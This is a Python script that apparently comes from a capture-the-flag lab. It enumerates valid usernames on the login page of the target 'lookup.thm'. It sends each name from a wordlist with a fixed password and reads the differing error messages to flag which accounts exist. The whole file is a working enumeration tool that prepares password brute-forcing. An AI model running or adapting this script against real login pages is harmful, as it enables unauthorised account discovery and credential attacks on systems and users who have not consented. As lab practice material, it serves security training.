import requests

url = "http://lookup.thm/login.php"
username_file = "/home/mystic/Downloads/test/htb/names.txt"
password = "password"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
}

def check_username(username):
    data = {
        "username": username,
        "password": password
    }
    try:
        response = requests.post(url, data=data, headers=headers)
        if "Wrong password" in response.text:
            print(f"Username found: {username}")
        elif "wrong username" in response.text:
            pass
        else:
            print(f"[?] Unexpected response for username: {username}")
    except requests.RequestException as e:
        print(f"[!] Request failed for username {username}: {e}")

if __name__ == "__main__":
    try:
        with open(username_file, "r") as file:
            for line in file:
                username = line.strip()
                if username:
                    check_username(username)
    except FileNotFoundError:
        print(f"[!] Wordlist file '{username_file}' not found!")
    except requests.RequestException as e:
        print(f"[!] An HTTP request error occurred: {e}")